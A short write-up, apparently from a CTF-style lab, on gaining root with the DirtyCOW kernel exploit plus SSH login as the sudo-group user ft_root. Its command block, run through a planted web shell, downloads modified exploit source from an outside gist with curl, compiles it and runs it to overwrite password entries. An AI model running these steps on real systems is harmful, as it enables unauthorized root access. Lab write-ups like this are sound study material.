# DirtyCOW + ssh ft_root

One thing that I noticed is that `ft_root` is in `sudo` group
But it was not used at all and I decided to fix that! <br>

And one more fact about `ft_root`: it is allowed to connect via ssh, whereas `root` not!

So, I need to change `ft_root`'s password and use sudo to become `root`. <br>

`sudo` won't work if `root` user will be changed in `etc/passwd` so I need to keep `root`'s data. <br>
The most dirtycow scripts change only `root` user, so I took the one from [firefart](https://github.com/FireFart/dirtycow/blob/master/dirty.c) and modified it.

The upgraded script modifying not only `root`, but also `ft_root` (see [here](https://gist.githubusercontent.com/mhufflep/92a45e88f18e04a1e1de5c9657337dc0/raw/7fce15bc59f96144b463b642c7705339ef4f25b8/cow.c)).

This works perfectly from anywhere, but I prefer to run it using webshell `wsh.sh` that is running under www-data user.

```bash
wsh > curl -ks "https://gist.githubusercontent.com/mhufflep/92a45e88f18e04a1e1de5c9657337dc0/raw/7fce15bc59f96144b463b642c7705339ef4f25b8/cow.c" > cow.c

wsh > gcc cow.c -o dirty -lpthread -lcrypt

wsh > ./dirty 4242
```